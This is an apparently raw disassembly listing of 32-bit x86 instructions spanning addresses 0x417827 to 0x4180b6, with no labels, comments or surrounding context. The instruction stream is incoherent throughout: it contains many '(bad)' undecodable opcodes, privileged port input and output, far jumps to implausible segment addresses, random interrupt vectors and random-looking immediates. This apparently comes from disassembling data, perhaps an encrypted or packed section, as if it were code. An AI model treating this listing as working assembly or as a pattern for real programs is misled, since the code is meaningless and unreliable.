  417827:	iret   
  417828:	lods   al,BYTE PTR ds:[esi]
  417829:	mov    cl,0xb9
  41782b:	leave  
  41782c:	mov    edx,0xb5debdd6
  417831:	mov    eax,0xf9c0debc
  417836:	int    0xfa
  417838:	pop    es
  417839:	mov    esp,0xb0ee602
  41783e:	out    dx,eax
  41783f:	fcom   QWORD PTR [edx]
  417841:	or     al,0xc5
  417843:	jmp    0xec026425
  417848:	rol    ch,cl
  41784a:	int    0xcb
  41784c:	div    edi
  41784e:	mov    eax,0xefccb8f1
  417853:	add    dh,cl
  417855:	mov    esp,0xf7d4ddfa
  41785a:	(bad)  
  41785b:	jmp    0xcd09:0xc4cdc6fe
  417862:	in     eax,dx
  417863:	iret   
  417864:	(bad)  
  417865:	scas   al,BYTE PTR es:[edi]
  417866:	iret   
  417867:	(bad)  
  417868:	rol    dl,0xb0
  41786b:	out    0xde,eax
  41786d:	(bad)
  417870:	repz jecxz 0x417851
  417873:	out    dx,eax
  417874:	out    0xfc,eax
  417876:	not    al
  417878:	(bad)  
  41787a:	ret    0xe9c8
  41787d:	in     eax,dx
  41787e:	out    dx,eax
  41787f:	add    BYTE PTR [edx],dl
  417881:	fdivrp st(0),st
  417883:	lods   eax,DWORD PTR ds:[esi]
  417884:	mov    cl,0xe3
  417886:	mov    ebp,0xece1e3e0
  41788b:	vpsubb xmm7,xmm0,XMMWORD PTR [ebx-0xa4110fd]
  417893:	add    bh,ah
  417895:	aad    0xc6
  417897:	rcl    esi,1
  417899:	ret    
  41789a:	add    ebp,eax
  41789c:	leave  
  41789d:	iret   
  41789e:	pop    es
  41789f:	sti    
  4178a0:	jmp    0xf0f169af
  4178a5:	retf   
  4178a6:	xlat   BYTE PTR ds:[ebx]
  4178a7:	mov    ch,0xf1
  4178a9:	(bad)  
  4178aa:	call   0xef076b6a
  4178af:	out    dx,al
  4178b0:	add    ch,bh
  4178b2:	rol    DWORD PTR [edi],cl
  4178b4:	not    ah
  4178b6:	fcomip st,st(3)
  4178b8:	stc    
  4178b9:	loope  0x4178c0
  4178bb:	lock call 0xef0b659e
  4178c1:	stc    
  4178c2:	shr    BYTE PTR [eax-0x1031113f],0xe0
  4178c9:	leave  
  4178ca:	fnstenv [ecx-0x8462b29]
  4178d0:	ret    
  4178d1:	std    
  4178d2:	cld    
  4178d3:	(bad)  
  4178d5:	neg    al
  4178d7:	loope  0x4178dc
  4178d9:	jmp    0xdce3:0xdbd8e0f4
  4178e0:	iret   
  4178e1:	or     edi,DWORD PTR [ebp-0x2212123b]
  4178e7:	shl    dl,1
  4178e9:	aam    0xd7
  4178eb:	retf   
  4178ec:	out    dx,eax
  4178ed:	rcr    bl,cl
  4178ef:	shl    edx,cl
  4178f1:	jmp    0xd7fe:0xe6f5d5dc
  4178f8:	fld    DWORD PTR [ebx]
  4178fa:	or     eax,DWORD PTR [ecx]
  4178fc:	fiadd  WORD PTR [ecx]
  4178fe:	(bad)  
  4178ff:	out    dx,eax
  417900:	fcmovne st,st(5)
  417902:	test   al,0xce
  417904:	mov    esi,0xc4dccbc0
  417909:	mov    ebx,0xd1b0efda
  41790e:	mov    edx,0xdffb03cb
  417913:	loopne 0x4178ec
  417915:	add    eax,0xf1fde5bb
  41791a:	jmp    0xc41b40f5
  41791f:	out    0xff,eax
  417921:	fisubr DWORD PTR [eax-0x13093936]
  417927:	(bad)  
  417928:	rcr    edx,cl
  41792a:	cmc    
  41792b:	(bad)  
  41792d:	int3   
  41792e:	mov    ecx,0xf7dbc8ba
  417933:	mov    ecx,0x700fade
  417938:	rol    edx,cl
  41793a:	add    eax,0xdee9c1f0
  41793f:	enter  0xe704,0xd1
  417943:	mov    eax,0xdcd2ade9
  417948:	rol    edx,cl
  41794a:	(bad)  
  41794b:	jmp    0xedd4:0xeed4eed7
  417952:	aad    0xda
  417954:	sti    
  417955:	rcl    edi,cl
  417957:	jmp    0x417953
  417959:	or     dl,al
  41795b:	std    
  41795c:	out    0xfe,al
  41795e:	(bad)  
  41795f:	jmp    0x41792d
  417961:	icebp  
  417962:	test   eax,0xb0f2e7a9
  417967:	mov    esp,0xeac8d6fa
  41796c:	(bad)  
  41796d:	icebp  
  41796e:	into   
  41796f:	icebp  
  417970:	in     al,dx
  417971:	mov    edx,0xd7bd01d7
  417976:	test   bh,0xd2
  417979:	std    
  41797a:	aad    0xf7
  41797c:	or     dh,ah
  41797e:	call   0xd40d7c6a
  417983:	repnz (bad) 
  417985:	retf   0xc4e8
  417988:	shl    ecx,cl
  41798a:	in     eax,dx
  41798b:	cmc    
  41798c:	leave  
  41798d:	(bad)  
  41798e:	in     eax,0xba
  417990:	aad    0xca
  417992:	fcomp  st(5)
  417994:	add    DWORD PTR [esi],eax
  417996:	sar    al,0xf3
  417999:	fdivrp st(0),st
  41799b:	stc    
  41799c:	idiv   dh
  41799e:	retf   0x413
  4179a1:	iret   
  4179a2:	mov    esi,0xc7c4f6d2
  4179a7:	mov    esp,0xe8b4f7f1
  4179ac:	in     eax,dx
  4179ad:	cli    
  4179ae:	cld    
  4179af:	jmp    0xe0c0:0xd2d4f7f3
  4179b6:	in     al,0xec
  4179b8:	fld    st(2)
  4179ba:	or     ebp,edx
  4179bc:	std    
  4179bd:	mov    esp,0xdcdbfcf8
  4179c2:	icebp  
  4179c3:	mov    esi,0xd0e6c7e3
  4179c8:	ret    
  4179c9:	sar    bl,cl
  4179cb:	into   
  4179cc:	jmp    0x41799e
  4179ce:	test   esi,0xd9bdca03
  4179d4:	aad    0xdc
  4179d6:	clc    
  4179d7:	fcmovu st,st(3)
  4179d9:	std    
  4179da:	loopne 0x4179de
  4179dc:	jmp    0xf1e5:0xde040ef4
  4179e3:	int    0xb3
  4179e5:	iret   
  4179e6:	loop   0x4179b4
  4179e8:	mov    dh,0xb5
  4179ea:	mov    ebx,0xd6f7d6f4
  4179ef:	mov    ebp,0xf2bcf5e3
  4179f4:	add    BYTE PTR [ecx],al
  4179f6:	(bad)  
  4179f7:	(bad)  
  4179f9:	mov    esp,0xf4fa04eb
  4179fe:	fcmovnu st,st(7)
  417a00:	stc    
  417a01:	int3   
  417a02:	shl    ch,1
  417a04:	rep lods al,BYTE PTR ds:[esi]
  417a06:	aad    0xef
  417a08:	sar    cl,cl
  417a0a:	mov    dl,0xae
  417a0c:	mov    al,0xf1
  417a0e:	mov    ch,0xda
  417a10:	aad    0xf8
  417a12:	(bad)  
  417a13:	imul   ebp
  417a15:	fdivr  st,st(4)
  417a17:	out    0xe4,al
  417a19:	pop    es
  417a1a:	fucom  st(0)
  417a1c:	loopne 0x417a1e
  417a1e:	in     eax,dx
  417a1f:	loop   0x417a28
  417a21:	out    0xbe,eax
  417a23:	scas   al,BYTE PTR es:[edi]
  417a24:	repnz scas al,BYTE PTR es:[edi]
  417a26:	lods   eax,DWORD PTR ds:[esi]
  417a27:	mov    cl,0xd0
  417a29:	lods   al,BYTE PTR ds:[esi]
  417a2a:	in     eax,dx
  417a2b:	neg    cl
  417a2d:	mov    ah,0xbd
  417a2f:	sti    
  417a30:	jmp    0xda245224
  417a35:	fadd   QWORD PTR [ebx]
  417a37:	fadd   st,st(6)
  417a39:	fmul   st,st(3)
  417a3b:	ret    0xcec9
  417a3e:	loop   0x417a1f
  417a40:	or     eax,0xe8a6e9c8
  417a45:	retf   
  417a46:	in     al,0xcb
  417a48:	enter  0xc7e9,0xca
  417a4c:	xlat   BYTE PTR ds:[ebx]
  417a4d:	mov    edi,0xfeeef0f1
  417a52:	sar    DWORD PTR [ebp-0x1905060f],1
  417a58:	pop    es
  417a59:	add    eax,0x808dfea
  417a5e:	fisttp DWORD PTR [edi]
  417a60:	or     esp,ebx
  417a62:	mov    dl,0xc5
  417a64:	fmulp  st(6),st
  417a66:	mov    ch,0xc3
  417a68:	jmp    0x417a5a
  417a6a:	jmp    0x417a5c
  417a6c:	(bad)  
  417a6d:	retf   0xebef
  417a70:	cmc    
  417a71:	ret    
  417a72:	clc    
  417a73:	iret   
  417a74:	fsubr  st(3),st
  417a76:	shr    bl,0xbd
  417a79:	(bad)  
  417a7b:	aad    0xc5
  417a7d:	add    al,0xcb
  417a7f:	add    eax,0xd2b3c0c8
  417a84:	scas   al,BYTE PTR es:[edi]
  417a85:	rol    bl,1
  417a87:	icebp  
  417a88:	into   
  417a89:	retf   0xd5b6
  417a8c:	in     al,0xd9
  417a8e:	mov    ecx,0x1cdd3bf
  417a93:	(bad)  
  417a95:	in     al,dx
  417a96:	out    0xd6,al
  417a98:	std    
  417a99:	shl    dl,cl
  417a9b:	jmp    0x30a738e
  417aa0:	loopne 0x417aaf
  417aa2:	lock jmp 0xc12e275a
  417aa8:	mov    al,0xeb
  417aaa:	jmp    0xbaee4369
  417aaf:	aam    0xe2
  417ab1:	(bad)  
  417ab2:	in     al,dx
  417ab3:	aam    0xf4
  417ab5:	(bad)  
  417ab6:	ret    0xf7c3
  417ab9:	fstp   st(0)
  417abb:	push   es
  417abc:	jmp    0xea0a:0xccddc3d8
  417ac3:	mov    eax,0xc0e6c6dc
  417ac8:	aad    0xa8
  417aca:	cmc    
  417acb:	stc    
  417acc:	mov    ah,0xcc
  417ace:	cli    
  417acf:	in     eax,dx
  417ad0:	jmp    0x417abc
  417ad2:	rcl    ebx,cl
  417ad4:	fyl2x  
  417ad6:	in     eax,0xfc
  417ad8:	add    dh,ch
  417ada:	(bad)  
  417adc:	loope  0x417abb
  417ade:	loopne 0x417aa4
  417ae0:	loop   0x417ae3
  417ae2:	mov    cl,0xc1
  417ae4:	lock (bad) 
  417ae6:	mov    bh,0xfb
  417ae8:	icebp  
  417ae9:	shl    esp,cl
  417aeb:	retf   
  417aec:	shl    bl,1
  417aee:	(bad)  
  417aef:	cld    
  417af0:	(bad)  
  417af1:	add    DWORD PTR [eax],eax
  417af3:	(bad)  
  417af5:	mov    esp,0xdcf8fcd8
  417afa:	fdiv   st(0),st
  417afc:	add    ebp,ecx
  417afe:	fld    st(5)
  417b00:	retf   0xc5d9
  417b03:	loopne 0x417aae
  417b05:	(bad)
  417b08:	mov    ebx,0xdfb0b3d6
  417b0d:	mov    ecx,0xd3faf3cf
  417b12:	loopne 0x417b00
  417b14:	repz loop 0x417b0a
  417b17:	sar    ecx,0xda
  417b1a:	add    al,0xe7
  417b1c:	(bad)  
  417b1d:	out    0xfa,eax
  417b1f:	or     dh,cl
  417b21:	adc    dl,bl
  417b23:	lock lock mov bl,0xee
  417b27:	iret   
  417b28:	into   
  417b29:	retf   0xd2d6
  417b2c:	stc    
  417b2d:	hlt    
  417b2e:	in     eax,0xef
  417b30:	call   0xd0375b11
  417b35:	shl    dl,1
  417b37:	mov    esp,0xd8fed9e1
  417b3c:	push   cs
  417b3d:	fsubp  st(1),st
  417b3f:	(bad)  
  417b40:	stc    
  417b41:	call   0xf11f2d2c
  417b46:	mov    bh,0xcc
  417b48:	mov    ah,0xf6
  417b4a:	mov    ah,0xc9
  417b4c:	mov    ebx,0xcccbcfd9
  417b51:	into   
  417b52:	add    esi,edi
  417b54:	repz (bad) 
  417b57:	(bad)  
  417b59:	retf   
  417b5a:	not    dh
  417b5c:	std    
  417b5d:	(bad)
  417b60:	out    dx,eax
  417b61:	bswap  ebx
  417b63:	shl    ebx,1
  417b65:	mov    bl,0xd6
  417b67:	(bad)  [edi-0x131f261a]
  417b6d:	cli    
  417b6e:	mov    esi,0xcfeff4d8
  417b73:	mov    esp,0xd4bce7d1
  417b78:	or     al,BYTE PTR [esi]
  417b7a:	add    eax,0xc30301da
  417b7f:	out    dx,eax
  417b80:	loop   0x417b70
  417b82:	fnstcw WORD PTR [eax-0x9282a1a]
  417b88:	jmp    0xf2373572
  417b8d:	clc    
  417b8e:	mov    bh,0xe3
  417b90:	fld    st(3)
  417b92:	leave  
  417b93:	rcr    esi,cl
  417b95:	out    dx,al
  417b96:	loope  0x417b5d
  417b98:	add    eax,0xe4c4e4d4
  417b9d:	loopne 0x417ba4
  417b9f:	out    0xb,eax
  417ba1:	add    ecx,ebx
  417ba3:	iret   
  417ba4:	lods   al,BYTE PTR ds:[esi]
  417ba5:	enter  0xf2e2,0xe6
  417ba9:	(bad)
  417bac:	fdivrp st(4),st
  417bae:	lock (bad) 
  417bb1:	loop   0x417b8a
  417bb3:	mov    esp,0xc6dad3ef
  417bb8:	(bad)  
  417bb9:	jmp    0xfd0a:0x3df0afc
  417bc0:	fdivrp st(1),st
  417bc2:	mov    eax,0xf1aea8aa
  417bc7:	loopne 0x417b8d
  417bc9:	lock loopne 0x417bbb
  417bcc:	clc    
  417bcd:	fsin   
  417bcf:	mov    ch,0xba
  417bd1:	mov    edx,0xf5d1cef0
  417bd6:	out    0x1,eax
  417bd8:	ret    
  417bd9:	fdiv   st(4),st
  417bdb:	std    
  417bdc:	loope  0x417bd7
  417bde:	add    ch,cl
  417be0:	fiadd  DWORD PTR [eax+edi*4]
  417be3:	loope  0x417b93
  417be5:	out    dx,al
  417be6:	mov    ebp,0xceb6daf7
  417beb:	aam    0xf9
  417bed:	mov    ebx,0xfad8bff2
  417bf2:	add    edi,DWORD PTR [edi-0x20c19fa]
  417bf8:	xlat   BYTE PTR ds:[ebx]
  417bf9:	cli    
  417bfa:	pop    es
  417bfb:	out    0xf7,eax
  417bfd:	loop   0x417bdb
  417bff:	fcmovne st,st(2)
  417c01:	inc    esp
  417c03:	mov    esp,0xc1d0c6f0
  417c08:	loope  0x417bce
  417c0a:	mov    dh,0xcc
  417c0c:	jmp    0xbbdf:0xeceacad3
  417c13:	int    0xbd
  417c15:	mov    eax,0x204dac3
  417c1a:	fdivrp st(7),st
  417c1c:	retf   
  417c1d:	leave  
  417c1e:	in     eax,0xe2
  417c20:	repnz icebp 
  417c22:	test   eax,0xcce3adc6
  417c27:	mov    cl,0xcc
  417c29:	mov    dl,0xf8
  417c2b:	fsubr  st,st(0)
  417c2d:	mov    ah,0xd5
  417c2f:	aam    0xfb
  417c31:	leave  
  417c32:	iret   
  417c33:	std    
  417c34:	loope  0x417c2f
  417c36:	fcomp  st(5)
  417c38:	push   es
  417c39:	shl    esi,0xe5
  417c3c:	add    DWORD PTR [edi],ecx
  417c3e:	pop    es
  417c3f:	iret   
  417c40:	into   
  417c41:	out    0xc5,al
  417c43:	vpavgb xmm3,xmm2,xmm4
  417c47:	stos   BYTE PTR es:[edi],al
  417c48:	ror    ecx,1
  417c4a:	int    0xc9
  417c4c:	shl    BYTE PTR [edi-0x22040242],1
  417c52:	mov    esp,0xfbd3f8b8
  417c57:	cmc    
  417c58:	in     eax,0xe1
  417c5a:	mov    edi,0xe500e8e8
  417c60:	or     ebx,edx
  417c62:	lods   al,BYTE PTR ds:[esi]
  417c63:	sar    BYTE PTR [ebp-0xd0b2909],cl
  417c69:	mov    dl,0xef
  417c6b:	vpmuludq ymm5,ymm5,ymm7
  417c6f:	fidivr DWORD PTR [edi-0x3c17110f]
  417c75:	stc    
  417c76:	int    0xfd
  417c78:	fcomi  st,st(5)
  417c7a:	xlat   BYTE PTR ds:[ebx]
  417c7b:	jmp    0x417c57
  417c7d:	out    0xe2,eax
  417c7f:	add    DWORD PTR [eax],eax
  417c81:	or     eax,0xc8afd8aa
  417c86:	rol    esi,1
  417c88:	vpmullw ymm6,ymm1,ymm6
  417c8c:	jmp    0x417c64
  417c8e:	stc    
  417c8f:	clc    
  417c90:	mov    ebx,0xe6f9f5f7
  417c95:	hlt    
  417c96:	std    
  417c97:	in     eax,0xe3
  417c99:	retf   
  417c9a:	stc    
  417c9b:	(bad)
  417c9e:	loope  0x417c8d
  417ca0:	retf   0xefcb
  417ca3:	loopne 0x417c9c
  417ca5:	not    bl
  417ca7:	iret   
  417ca8:	loope  0x417c99
  417caa:	mov    ecx,0xfccbe4f4
  417caf:	mov    ah,0xbd
  417cb1:	icebp  
  417cb2:	fcomip st,st(3)
  417cb4:	ret    
  417cb5:	hlt    
  417cb6:	aad    0xfe
  417cb8:	test   eax,0xc0cbe0e4
  417cbe:	out    0xe3,eax
  417cc0:	iret   
  417cc1:	cld    
  417cc2:	in     al,0xdd
  417cc4:	shl    dh,1
  417cc6:	in     al,dx
  417cc7:	aad    0xc6
  417cc9:	int    0xf9
  417ccb:	out    dx,eax
  417ccc:	div    ebx
  417cce:	repnz mov ah,0xb4
  417cd1:	int3   
  417cd2:	fstp   st(1)
  417cd4:	mov    ecx,0xffd7dadc
  417cd9:	add    eax,esp
  417cdb:	in     eax,0xf9
  417cdd:	lds    eax,FWORD PTR [edi]
  417cdf:	cli    
  417ce0:	or     eax,ebp
  417ce2:	ret    
  417ce3:	loopne 0x417cc5
  417ce5:	jmp    0x417cb4
  417ce7:	sar    ebx,1
  417ce9:	mov    bl,0xef
  417ceb:	repz repnz not esp
  417cef:	jmp    0xcdf2:0xf0cfd5ef
  417cf6:	in     eax,0xf1
  417cf8:	fucom  st(7)
  417cfa:	fdivr  st(5),st
  417cfc:	(bad)  
  417cfd:	fnsetpm(287 only) 
  417cff:	push   cs
  417d00:	adc    ebx,edx
  417d02:	in     al,dx
  417d03:	loopne 0x417cf8
  417d05:	mov    bh,0xd7
  417d07:	jmp    0xcf3a71f1
  417d0c:	call   0xf01a480c
  417d11:	not    ch
  417d13:	sar    ecx,0xd6
  417d16:	sti    
  417d17:	fadd   st,st(7)
  417d19:	ffree  st(7)
  417d1b:	sti    
  417d1c:	xlat   BYTE PTR ds:[ebx]
  417d1d:	(bad)  
  417d1e:	cli    
  417d1f:	hlt    
  417d20:	add    al,0xa
  417d22:	stos   DWORD PTR es:[edi],eax
  417d23:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d25:	out    0xf4,al
  417d27:	mov    dl,0xea
  417d29:	in     al,0xb9
  417d2b:	fcomi  st,st(3)
  417d2d:	not    cl
  417d2f:	std    
  417d30:	(bad)  
  417d31:	mov    ebx,0xdbd3d3e0
  417d36:	loop   0x417d28
  417d38:	mov    ecx,0xdbc7c4f0
  417d3d:	fcmovu st,st(3)
  417d3f:	(bad)  
  417d41:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d43:	vpsrlw xmm4,xmm2,xmm3
  417d47:	fcmovne st,st(2)
  417d49:	fptan  
  417d4b:	mov    cl,0xdf
  417d4d:	repnz int 0xb5
  417d50:	mov    edi,0x6f0fbec
  417d55:	repnz add bl,bl
  417d58:	add    al,0xdf
  417d5a:	add    edx,esp
  417d5c:	fisttp QWORD PTR [edx]
  417d5e:	enter  0xf8db,0xdd
  417d62:	shl    DWORD PTR [edx-0x3613410d],0xd5
  417d69:	rcl    esi,1
  417d6b:	icebp  
  417d6c:	cli    
  417d6d:	repnz lock in al,0xf0
  417d71:	mov    ebx,0xccceddd4
  417d76:	add    al,0xe0
  417d78:	xlat   BYTE PTR ds:[ebx]
  417d79:	icebp  
  417d7a:	or     ebp,edx
  417d7c:	enter  0x8df,0xdf
  417d80:	stc    
  417d81:	jmp    0xee264a48
  417d86:	loopne 0x417d58
  417d88:	shr    DWORD PTR [eax-0x2100372b],0xc5
  417d8f:	repnz add cl,cl
  417d92:	loope  0x417d66
  417d94:	add    ecx,esi
  417d96:	in     eax,0xd8
  417d98:	add    DWORD PTR [eax],eax
  417d9a:	jmp    0x417d94
  417d9c:	or     dl,ch
  417d9e:	add    eax,0xaecddbde
  417da3:	in     al,0xc8
  417da5:	enter  0xc2c9,0xa9
  417da9:	in     al,0xb4
  417dab:	(bad)  
  417dac:	in     al,0xcc
  417dae:	cld    
  417daf:	(bad)  
  417db1:	repz in eax,dx
  417db3:	(bad)  
  417db5:	mov    ah,0xdb
  417db7:	in     al,dx
  417db8:	cmc    
  417db9:	test   DWORD PTR ds:0xee03f9e8,0xd00dd900
  417dc3:	loop   0x417d76
  417dc5:	in     eax,0xf0
  417dc7:	int    0xda
  417dc9:	jmp    0xb9f8:0xb8cae9cf
  417dd0:	std    
  417dd1:	aad    0xf6
  417dd3:	add    edi,ebx
  417dd5:	loop   0x417da3
  417dd7:	clc    
  417dd8:	(bad)  
  417dda:	cli    
  417ddb:	leave  
  417ddc:	out    0xcb,eax
  417dde:	(bad)  
  417de0:	out    0xdc,al
  417de2:	fsubr  st,st(4)
  417de4:	rol    al,cl
  417de6:	retf   
  417de7:	leave  
  417de8:	ret    0xe5cf
  417deb:	call   0xfe327dc5
  417df0:	cld    
  417df1:	fdiv   DWORD PTR [edi+0x1bfb9f8]
  417df7:	mov    dl,0xfa
  417dfa:	(bad)
  417dfe:	add    al,ah
  417e00:	leave  
  417e01:	shl    al,cl
  417e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e04:	leave  
  417e05:	in     eax,0xcf
  417e07:	lods   al,BYTE PTR ds:[esi]
  417e08:	mov    bh,0xcf
  417e0a:	leave  
  417e0b:	cmc    
  417e0c:	ftst   
  417e0e:	into   
  417e0f:	div    edi
  417e11:	idiv   ebx
  417e13:	iret   
  417e14:	into   
  417e15:	fcmovb st,st(6)
  417e17:	clc    
  417e18:	add    ebx,esi
  417e1a:	(bad)  
  417e1b:	or     ebp,esp
  417e1d:	or     eax,esp
  417e1f:	ret    0x9e2
  417e22:	shl    ch,1
  417e24:	(bad)  
  417e25:	fsub   st(6),st
  417e27:	enter  0xd5e7,0xd2
  417e2b:	mov    edx,0xbffed1f1
  417e30:	out    dx,eax
  417e31:	ret    0xfed3
  417e34:	mov    esi,0xc206cdcd
  417e39:	fcomp  st(4)
  417e3b:	jmp    ebx
  417e3d:	hlt    
  417e3e:	push   cs
  417e3f:	enter  0x9ef,0xdf
  417e43:	retf   
  417e44:	fisubr WORD PTR [eax+eiz*8-0x93b3740]
  417e4b:	rol    ch,cl
  417e4d:	mov    edx,0xe3fbefc5
  417e52:	call   0xff035833
  417e57:	pop    es
  417e58:	(bad)  
  417e59:	retf   
  417e5a:	jmp    0xe1f8:0xe6e9eae1
  417e61:	jecxz  0x417e0b
  417e63:	retf   0xbde0
  417e66:	mov    bh,0xb1
  417e68:	mov    ch,0xcb
  417e6a:	retf   
  417e6b:	retf   0xd3c8
  417e6e:	mov    eax,0xcde1eaf9
  417e73:	rcr    eax,0xd4
  417e76:	shl    al,1
  417e78:	loopne 0x417e58
  417e7a:	xlat   BYTE PTR ds:[ebx]
  417e7b:	or     ah,bh
  417e7d:	(bad)  
  417e7e:	out    dx,al
  417e7f:	cld    
  417e80:	loop   0x417e86
  417e82:	leave  
  417e83:	jecxz  0x417e63
  417e85:	aad    0xc6
  417e87:	(bad)  
  417e88:	xlat   BYTE PTR ds:[ebx]
  417e89:	stc    
  417e8a:	aad    0xae
  417e8c:	out    dx,al
  417e8d:	neg    edi
  417e8f:	lock rcr bl,cl
  417e92:	repz into 
  417e94:	aam    0x5
  417e96:	in     eax,0xdd
  417e98:	div    esi
  417e9a:	or     ebp,edi
  417e9c:	leave  
  417e9d:	fsub   st,st(0)
  417e9f:	push   cs
  417ea0:	or     eax,0xcfc9f3c8
  417ea5:	(bad)
  417ea8:	div    BYTE PTR [esi-0x438353b]
  417eae:	leave  
  417eaf:	icebp  
  417eb0:	add    dl,bh
  417eb2:	hlt    
  417eb3:	mul    cl
  417eb5:	ffreep st(7)
  417eb7:	fild   DWORD PTR ds:0x6eff003
  417ebd:	stc    
  417ebe:	fsubr  st,st(3)
  417ec0:	repz fmul st(0),st
  417ec3:	mov    cl,0xdc
  417ec5:	mov    bl,0xf4
  417ec7:	cmc    
  417ec8:	in     al,dx
  417ec9:	lock sti 
  417ecb:	(bad)
  417ecf:	(bad)  
  417ed0:	jmp    0xddf3:0xcde3ddf0
  417ed7:	(bad)
  417eda:	add    BYTE PTR [ecx],cl
  417edc:	add    eax,0x209fac5
  417ee1:	(bad)  
  417ee3:	mov    edi,0xf7c0ebc8
  417ee8:	retf   
  417ee9:	jmp    0xb5f97ad8
  417eee:	mov    edi,0xdcd6ebb9
  417ef3:	fadd   DWORD PTR [edx]
  417ef5:	(bad)  
  417ef7:	mov    esp,0xe3ded5bc
  417efc:	or     ecx,edi
  417efe:	or     cl,bh
  417f00:	or     BYTE PTR [edx],dl
  417f02:	call   0xcdf355fe
  417f07:	rol    bl,cl
  417f09:	jmp    0xb93833c2
  417f0e:	jmp    0xe3fb:0x3d8fcb9
  417f15:	repz icebp 
  417f17:	not    ebx
  417f19:	(bad)  
  417f1b:	fcmovu st,st(3)
  417f1d:	cli    
  417f1e:	jmp    0xcabf:0xa804eecf
  417f25:	mov    bl,0xdc
  417f27:	sar    bl,1
  417f29:	shl    BYTE PTR [ebp-0x24020f11],1
  417f2f:	(bad)  
  417f30:	cld    
  417f31:	mov    ah,0xf5
  417f33:	add    BYTE PTR [edi],al
  417f35:	stc    
  417f36:	rol    ah,0xe7
  417f39:	(bad)  
  417f3a:	fmulp  st(0),st
  417f3c:	ror    BYTE PTR [edx],0x4
  417f3f:	fdivp  st(7),st
  417f41:	adc    cl,bl
  417f43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f44:	out    dx,eax
  417f45:	enter  0xd3d3,0xd2
  417f49:	jmp    0x417f24
  417f4b:	call   0xcd0b531d
  417f50:	ret    
  417f51:	cli    
  417f52:	mov    edx,0xfad8d2d9
  417f57:	repz jmp 0x417f5f
  417f5a:	add    al,0x2
  417f5c:	(bad)  
  417f5e:	leave  
  417f5f:	or     dh,bl
  417f61:	rol    al,cl
  417f63:	ret    0xadf0
  417f66:	scas   al,BYTE PTR es:[edi]
  417f67:	mov    bl,0xe5
  417f69:	into   
  417f6a:	in     al,dx
  417f6b:	in     eax,0xd8
  417f6d:	(bad)  
  417f6e:	mov    ah,0xea
  417f70:	mov    esi,0xddefbefa
  417f75:	mov    esi,0xd1c2d9d7
  417f7a:	jmp    0xffe:0xe1c9fe
  417f81:	push   cs
  417f82:	mov    cl,0xa8
  417f84:	fadd   st(0),st
  417f86:	mov    bl,0xd3
  417f88:	shr    esi,cl
  417f8a:	call   0xb8126673
  417f8f:	(bad)  
  417f90:	sar    BYTE PTR [edi+0x6d9c3fd],cl
  417f96:	add    edi,edi
  417f98:	push   es
  417f99:	out    0x7,eax
  417f9b:	fdiv   st,st(5)
  417f9d:	or     eax,0xec40c01
  417fa2:	mov    edi,0xb6c3e9ee
  417fa7:	xlat   BYTE PTR ds:[ebx]
  417fa8:	enter  0xe6ec,0xd0
  417fac:	cmc    
  417fad:	(bad)  
  417faf:	in     eax,dx
  417fb0:	leave  
  417fb1:	div    esp
  417fb3:	pop    es
  417fb4:	loop   0x417fbb
  417fb6:	push   es
  417fb7:	ret    
  417fb8:	ret    0xd0f4
  417fbb:	jmp    0xc3208287
  417fc0:	repz or ebp,ecx
  417fc3:	loope  0x417fa3
  417fc5:	loop   0x417f7a
  417fc7:	ret    0xb0ac
  417fca:	jmp    0xd1d0:0xd7dfb5b0
  417fd1:	add    DWORD PTR [edx],eax
  417fd3:	stc    
  417fd4:	std    
  417fd5:	shl    ecx,0xec
  417fd8:	add    eax,0x9fbd5e4
  417fdd:	hlt    
  417fde:	hlt    
  417fdf:	int3   
  417fe0:	loope  0x417fb5
  417fe2:	(bad)  
  417fe4:	shr    BYTE PTR [esi-0x2c3b0b51],0xd1
  417feb:	mov    al,0xff
  417fed:	fcomi  st,st(4)
  417fef:	rcl    edi,1
  417ff1:	(bad)  
  417ff3:	cmc    
  417ff4:	in     eax,dx
  417ff5:	add    cl,bl
  417ff7:	mul    dh
  417ff9:	mov    esp,0xcbc1dd03
  417ffe:	out    dx,al
  417fff:	call   0xe3026beb
  418004:	out    0xce,al
  418006:	mov    ebp,0xb5ecf3b4
  41800b:	enter  0xf6b4,0xdf
  41800f:	iret   
  418010:	mov    ebp,0xdbeccdb9
  418015:	repz add bl,cl
  418018:	mov    ecx,0xf9d6f5ea
  41801d:	(bad)  
  41801f:	int    0xa
  418021:	add    eax,0xe0f0c4d8
  418026:	leave  
  418027:	shl    DWORD PTR [ecx-0x1a0e2738],cl
  41802d:	aad    0xef
  41802f:	leave  
  418030:	retf   0xbaff
  418033:	into   
  418034:	add    bh,dh
  418036:	mov    ebx,0xdff60af2
  41803b:	(bad)  [eax]
  41803d:	clc    
  41803e:	(bad)  
  41803f:	aam    0xd3
  418041:	(bad)  
  418043:	mov    ebp,0xe1c2b0e6
  418048:	test   al,0xfb
  41804b:	(bad)
  41804e:	fstp   TBYTE PTR [ebx-0x32002005]
  418054:	(bad)  
  418056:	loope  0x418016
  418058:	(bad)  
  418059:	aam    0xf5
  41805b:	(bad)  
  41805c:	sti    
  41805d:	mov    esp,0xae7c2fb
  418062:	loopne 0x418045
  418064:	in     al,dx
  418065:	scas   al,BYTE PTR es:[edi]
  418066:	into   
  418067:	shl    ah,0xb7
  41806a:	(bad)  
  41806b:	xlat   BYTE PTR ds:[ebx]
  41806c:	in     eax,dx
  41806d:	lods   al,BYTE PTR ds:[esi]
  41806e:	repnz mov eax,0xfdb7d2ef
  418074:	add    edi,DWORD PTR [ebp-0x3bf90822]
  41807a:	jmp    0xe9458676
  41807f:	add    ebp,ecx
  418081:	rol    ecx,cl
  418083:	jmp    0xe0e5:0xd1c9ecae
  41808a:	imul   edx
  41808c:	int    0xe6
  41808e:	clc    
  41808f:	in     eax,dx
  418090:	(bad)  
  418091:	mov    al,0xc1
  418093:	(bad)  
  418095:	in     al,dx
  418096:	rol    BYTE PTR [edx],1
  418098:	std    
  418099:	fadd   st,st(4)
  41809b:	fsubp  st(1),st
  41809d:	aam    0xdd
  41809f:	(bad)  
  4180a0:	dec    BYTE PTR [esi]
  4180a2:	mov    ebp,0xccdcacb3
  4180a7:	jmp    0xf1ca:0xe7d6b7cf
  4180ae:	repz (bad) 
  4180b1:	(bad)  
  4180b3:	out    dx,al
  4180b4:	stc    
  4180b5:	(bad)  
  4180b6:	mov    ebp,0xd0f9d5cc
